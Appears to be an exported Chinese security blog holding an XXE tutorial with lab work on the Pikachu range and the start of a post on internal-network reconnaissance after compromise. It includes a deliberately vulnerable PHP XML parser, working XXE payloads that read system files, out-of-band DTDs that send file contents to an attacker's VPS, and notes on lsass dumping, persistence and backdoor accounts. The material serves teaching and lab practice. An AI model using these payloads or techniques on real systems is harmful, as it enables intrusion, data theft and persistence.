<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></div>

<p>这个DTD就定义了XML的根元素是message，然后根元素下面有一些子元素，这就定义了这个XML必须像下面这样写</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;/receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;/sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;/header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;/msg&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure></div>



<p>但是除了用DTD定义元素（其实就是标签）之外，还可以定义实体（就是标签里面的内容）</p>
<p>如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure></div>

<p>上面的ANY说明接受任何元素，我们定义了一个test的实体，这样我们就可以在其他代码中引用这个实体，如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>通过&amp;xxe这个代码来进行应用刚才定义的实体，输出的时候&amp;xxe;就会被替换成test</p>
<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>其实实体分为两种，外部实体和内部实体，上面的例子是内部实体，实体也可以从外部的.dtd文件中应用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;   外部文件导入</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;           引用这个导入的文件</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>这样的话要更改实体非常的方便，这就是外部实体</p>
<p>还有一种引用方式就是引用公用DTD的方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure></div>

<p>也是和SYSTEM一样的效果</p>
<h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>实体除了按内外部划分之外，还能从另一个角度划分为通用实体和参数实体</p>
<p>1.通用实体</p>
<p>用<code>&amp;实体名;</code>这种形式引用实体，在DTD中定义，在XML文档中引用（就是上面的例子的实体类型）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure></div>

<p>2.参数实体</p>
<p>使用<code>% 实体名</code>（%和实体名之间有个空格，不能少）在DTD中定义，但是这个只能在DTD中使用<code>%实体名;</code>（没有空格）引用</p>
<p>只有在DTD文件中，参数实体的声明才能引用其他实体</p>
<p>和通用实体一样，参数实体也可以外部引用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure></div>



<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>上面我们清楚了外部实体是什么东西之后，我们就可以思考该怎么去利用来实行攻击</p>
<p>如这个代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>我们可以想得到既然它可以调用读取外部的.dtd文件，那么我们可不可以将路径换一下读取敏感文件呢，如win.ini</p>
<h4 id="实验1-有回显的敏感文件读取"><a href="#实验1-有回显的敏感文件读取" class="headerlink" title="实验1 有回显的敏感文件读取"></a>实验1 有回显的敏感文件读取</h4><p>场景是服务器能够解析XML代码，并且有回显</p>
<p>所以我们先写一段能解析XML代码的php文件</p>
<p>xml.php</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>将这个文件放入phpstudy的www文件夹下，并访问</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415164710822.png"
                      alt="image-20230415164710822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415164843614.png"
                      alt="image-20230415164843614"
                ></p>
<p>构造payload</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415165039422.png"
                      alt="image-20230415165039422"
                ></p>
<p>没反应，绝了</p>
<p>看别人的实例吧</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415170123309.png"
                      alt="image-20230415170123309"
                ></p>
<p>就是会读取system.ini文件内容，这样就利用成功了</p>
<p>但是如果读取的文件里面有特殊符号，就会造成错误</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415170314022.png"
                      alt="image-20230415170314022"
                ></p>
<p>他的主要原因是因为有些内容不想让解析引擎解析执行，而是当作原始的内容处理，所以就解析成纯字符的形式</p>
<p>但是CDATA中的所有字符就被当作元素字符数据的常量部分，而不是xml标记</p>
<p>所以我们可以利用在CDATA中输出所需要读取的文件就可以绕开报错了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[   里面是读取的文件字符   ]]&gt;    </span><br></pre></td></tr></table></figure></div>

<p>接下来就是让文件字符出现在CDATA里面了，但是xml并没有提供拼接的函数，所以得换个思路</p>
<p>使用参数实体进行拼接</p>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure></div>

<p>上面dtd使用引用通用实体将<code>&quot;&lt;![CDATA[&quot;</code>    <code>&quot;file:///d:/test.txt&quot;</code>       <code>&quot;]]&quot;</code>这三个进行定义</p>
<p>然后就会调用evil.dtd的内容用参数实体定义，将这三个拼接并解析</p>
<p>然后回到上面<code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>引用输出</p>
<p>evil.dtd</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415171725842.png"
                      alt="image-20230415171725842"
                ></p>
<p>就可以输出带有特殊字符的文件了</p>
<h6 id="但是！"><a href="#但是！" class="headerlink" title="但是！"></a>但是！</h6><p>xml他就不是用来输出的，一般是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析xml类</p>
<p>所以有回显的方法一般没啥用，需要一个无回显读取的方法——外带</p>
<p>想要外带我们必须要能发起请求，显然外部实体定义的时候就可以发起请求，</p>
<p>我们还要把数据传出去，传输数据也是一种请求，所以用套娃在请求中请求（具体说应该是在请求中调用另一次请求的结果）</p>
<h4 id="实验二-无回显的本地敏感文件读取"><a href="#实验二-无回显的本地敏感文件读取" class="headerlink" title="实验二 无回显的本地敏感文件读取"></a>实验二 无回显的本地敏感文件读取</h4><p>xml.php</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>test.did</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip(vps):9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p>由于解析问题，所以需要将send前面的%用<code>&amp;#37;</code>替代</p>
<p>payload</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip (被攻击)/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<p>上面的teat.did代码第一行定义了一个参数实体%file用于读取test.txt文件的信息，然后用于第二行中</p>
<p>的文件传输</p>
<p>利用过程就是payload中的%remote调用请求远程服务器上的test.dtd文件，然后test.dtd文件中%int就会被调用，这就导致了第一行代码%file就会被调用，用于读取服务器上面的敏感文件test.txt，然后看第二行代码%send就会将敏感文件传输至自己的vps上，这样就解决了xxe没有回显的情况，实现了敏感数据外带</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415182202947.png"
                      alt="image-20230415182202947"
                ></p>
<p>结果</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230415182214942.png"
                      alt="image-20230415182214942"
                ></p>
<p>各种协议的脚本适用环境</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i0.hdslb.com/bfs/article/8f7e9203dee418ddd2333e490ab2cc22d2171fa7.png@831w_284h_progressive.webp"
                      alt="img"
                ></p>
<p>#读取文件</p>
<p>—用file伪协议读取c盘的1.txt文件，当然这里的伪协议是隐藏在XML的文档实体中</p>
<p>—这种是有回显的类型的漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;       //xml的声明</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [              //文档的类型定义：这里是所有的格式都可以</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c://1.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;                           //文档的实体，xxe为实体里面的变量，下面就执行这个变量</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>

<p>#玩法-内网探针或攻击内网应用（触发漏洞地址）</p>
<p>—这里是探针内网端口对应的网站（相当于进行了端口扫描）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;         //XML声明</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE foo [                                //文档声明</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT foo ANY &gt;                            //文档的类型</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http:// 192.168.102.143:8888/1.txt&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;                                             //文档的实体</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;rabbit;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>

<p>#玩法-RCE（该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令）</p>
<p>— RCE是远程命令执行漏洞</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>

<p>#引入外部实体dtd</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">        </span><br><span class="line">        &lt;!ENTITY % FILE SYSTEM &quot;HTTP://127.0.0.1:8081/evil2.dtd&quot;&gt;</span><br><span class="line">        </span><br><span class="line">        %file;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;send;&lt;/x&gt;</span><br><span class="line"></span><br><span class="line">evil2.dtd:</span><br><span class="line">这个文件里面的内容：&lt;!ENTITY send SYSTEM&quot;file&quot;///d:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p>#无回显-读取文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=1.txt&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.102.143:8888/test.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%dtd;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test.dtd</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line"></span><br><span class="line">&quot;&lt;!ENTITY &amp;#X25; send system</span><br><span class="line"></span><br><span class="line">&#x27;http://192.168.0.103:8081/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure></div>

<p>#协议-读文件（绕过）</p>
<p>参考：<a class="link"   href="https://www.cnblogs.com/201752111yz/p/11413335.html" >https://www.cnblogs.com/201752111yz/p/11413335.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [ &lt;!entity f system</span><br><span class="line"></span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>



<h4 id="pikachu靶场实践"><a href="#pikachu靶场实践" class="headerlink" title="pikachu靶场实践"></a>pikachu靶场实践</h4><p>我们可以通过pikachu靶场来进行实践</p>
<h6 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file&#x2F;&#x2F;协议"></a>file&#x2F;&#x2F;协议</h6><p>先在桌面创建一个111.txt文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416135716825.png"
                      alt="image-20230416135716825"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416135749770.png"
                      alt="image-20230416135749770"
                ></p>
<p>在输入框中输入payload，读取路径下的111.txt文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///C:/Users/hc/Desktop/111.txt&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>读取成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416135912842.png"
                      alt="image-20230416135912842"
                ></p>
<p>同理可以用来读取系统中的敏感文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140017335.png"
                      alt="image-20230416140017335"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [ </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///C:/windows/win.ini&quot;&gt; ]&gt;  </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure></div>

<p>读取成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140102058.png"
                      alt="image-20230416140102058"
                ></p>
<h6 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h6><p>xxe也支持http的url格式，所以可以产生与ssrf一样的请求效果，可以用作内网探测</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.124:4444/test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;&lt;/r&gt;</span><br></pre></td></tr></table></figure></div>

<p>不存在的端口就会产生报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140634383.png"
                      alt="image-20230416140634383"
                ></p>
<p>成功的话就会返回空白</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230416140703589.png"
                      alt="image-20230416140703589"
                ></p>
<h4 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h4><h6 id="白盒：代码审计"><a href="#白盒：代码审计" class="headerlink" title="白盒：代码审计"></a>白盒：代码审计</h6><h6 id="黑盒："><a href="#黑盒：" class="headerlink" title="黑盒："></a>黑盒：</h6><p>数据格式类型判断：  <user>test</user><pass>Mikasa</pass></p>
<p>Content-Type值的判断：1.text&#x2F;xml   2.application&#x2F;xml</p>
<p>更改Content-Type的值看返回</p>
<p>或者直接使用工具扫描</p>
<h5 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h5><p>参考链接：<a class="link"   href="https://xz.aliyun.com/t/3357" >https://xz.aliyun.com/t/3357 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>xxe的payload大全<a class="link"   href="https://github.com/payloadbox/xxe-injection-payload-list" >https://github.com/payloadbox/xxe-injection-payload-list <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>内网信息收集</title>
    <url>/2024/02/29/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>针对本机：收集网络情况和敏感信息</p>
<p>针对所处的网络：收集网段连通信息并进行内网资产探测，并且是否存在域环境</p>
<p>为了规避杀软与安全设备，尽量避免触发杀软警告的敏感操作于大量扫描，避免应急事件的发生</p>
<h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><h3 id="IP-x2F-权限-x2F-系统版本-x2F-用户"><a href="#IP-x2F-权限-x2F-系统版本-x2F-用户" class="headerlink" title="IP&#x2F;权限&#x2F;系统版本&#x2F;用户"></a>IP&#x2F;权限&#x2F;系统版本&#x2F;用户</h3><p>进入到该主机之后，可以先探测该网络内的网段信息</p>
<h4 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h4><p>ipconfig &#x2F;all</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804144020959.png"
                      alt="image-20230804144020959"
                ></p>
<h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804144329419.png"
                      alt="image-20230804144329419"
                ></p>
<h4 id="系统版本"><a href="#系统版本" class="headerlink" title="系统版本"></a>系统版本</h4><p>可以判断已拿到主机的系统详细信息</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804140330577.png"
                      alt="image-20230804140330577" style="zoom: 67%;" 
                >

<p>通过主机的名称来定位该主机的具体作用</p>
<p>以及可以查看该主机的补丁数来找到获取该主机的漏洞详情，进行进一步的利用</p>
<h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>进入该系统之后可以先查看该主机的用户信息</p>
<p>Windows</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804135646107.png"
                      alt="image-20230804135646107"
                ></p>
<p>域环境中有许多常见的用户身份</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Domain Admins：域管理员（默认对域控具有完全控制权）</span><br><span class="line">Domain Computers：域内机器</span><br><span class="line">Domain Controlers：域控制器</span><br><span class="line">Domain Guest：域访客，权限较低</span><br><span class="line">Domain Users：域用户</span><br><span class="line">Enterprise Admin：企业系统管理员用户（默认也是对域控有完全控制权）</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admin&quot; /domain   #查询域管理员账户</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804143219040.png"
                      alt="image-20230804143219040"
                ></p>
<p>可以利用net user &#x2F;domain、net group &#x2F;domain来获取域用户&#x2F;域用户组的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804143333669.png"
                      alt="image-20230804143333669"
                ></p>
<p>域sid、用户sid，获取到这个可为之后票据的伪造提供了条件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804143452768.png"
                      alt="image-20230804143452768"
                ></p>
<p>Linux</p>
<p>cat &#x2F;etc&#x2F;passwd</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804140109437.png"
                      alt="image-20230804140109437"
                ></p>
<h4 id="低权限"><a href="#低权限" class="headerlink" title="低权限"></a>低权限</h4><p>对于拿到的内网主机是低权限的话</p>
<p>可以查看系统的版本信息以及补丁的更新信息，探测有没有一些nday，可以利用这些漏洞对主机进行提权的操作</p>
<h4 id="高权限"><a href="#高权限" class="headerlink" title="高权限"></a>高权限</h4><p>如果拿到的机子是高权限或者进行提权之后，就可以考虑收集一些主机hash值等</p>
<h6 id="Dump-lsass内存"><a href="#Dump-lsass内存" class="headerlink" title="Dump lsass内存"></a>Dump lsass内存</h6><p>可以利用mimikatz这类工具进行内网主机NTLM hash的收集为之后的提权、持久化、委派提供良好的信息基础</p>
<h6 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h6><p>利用计划任务如at、schtasks可以进行计划任务的创建，这对权限的持久化有着巨大的帮助</p>
<h6 id="创建后门"><a href="#创建后门" class="headerlink" title="创建后门"></a>创建后门</h6><p>之后也可以创建后门，这也是为了进行权限维持，后门账户、后门木马等</p>
<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><h4 id="是否有域环境"><a href="#是否有域环境" class="headerlink" title="是否有域环境"></a>是否有域环境</h4><p>可以<code>ipconfig /all</code>这个命令来查询主机名以此判断该主机在内网环境的功能，以及判断是否存在域环境</p>
<p>下图显示就是该主机是处于一个域环境之中的，没有域环境就只会显示WORKGROUP工作组</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
